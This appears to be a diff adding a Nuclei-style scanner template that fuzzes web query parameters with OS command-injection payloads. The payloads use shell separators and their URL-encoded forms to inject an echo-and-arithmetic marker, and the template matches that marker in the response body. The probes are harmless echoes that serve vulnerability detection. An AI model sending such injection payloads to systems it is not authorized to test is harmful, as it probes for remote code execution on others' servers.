@@ -1,0 +1,50 @@
+id: jaeles-signatures-rce-second-replace
+
+info:
+  name: Reflected RCE Jaeles
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - 'echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - ';echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ%00.zip'
+        - 'echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - ';echo echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '&echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '&&cho AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '`echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ`'
+        - '|echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '||echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '&&echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%0aecho AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%3Becho AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%26echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%26%26echo AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%7Cecho AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        - '%7C%7Cecho AGIYMZ$((282037%2B31337))$(echo AGIYMZ)AGIYMZ'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "AGIYMZ313374AGIYMZAGIYMZ"
+        part: body
+      - type: status
+        status:
+          - 200
+          - 206
